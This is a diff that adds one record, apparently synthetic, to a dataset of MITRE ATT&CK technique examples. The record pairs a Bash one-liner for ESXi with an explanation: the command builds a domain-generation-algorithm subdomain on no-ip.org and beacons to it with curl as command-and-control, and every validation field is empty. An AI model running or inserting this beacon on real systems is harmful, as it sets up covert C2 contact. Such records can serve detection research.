@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "seed=\"$(hostname -s)-$(date -u +%Y%m%d)\"; h=$(echo -n \"$seed\" | sha1sum | cut -c1-20); sub=\"$(echo \"$h\" | cut -c1-10)-$(echo \"$h\" | cut -c11-20)\"; dom=\"$sub.no-ip.org\"; port=$(( 1024 + ($(date -u +%S) * 97 % 50000) )); curl -A \"esxi/$(uname -r)\" --connect-timeout 5 \"https://$dom:$port/signal\"",
+  "explanation": "Creates a hyphenated DGA subdomain from host and date, and a port derived from current seconds to vary C2 parameters. This implements dynamic resolution as described by T1568.",
+  "rationale_steps": [
+    "Combine hostname and date to form a predictable seed.",
+    "SHA-1 hash into a two-part subdomain to avoid static IoCs.",
+    "Calculate a changing port from the current second.",
+    "Beacon using curl to the generated domain and port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-f1ec9ef2",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
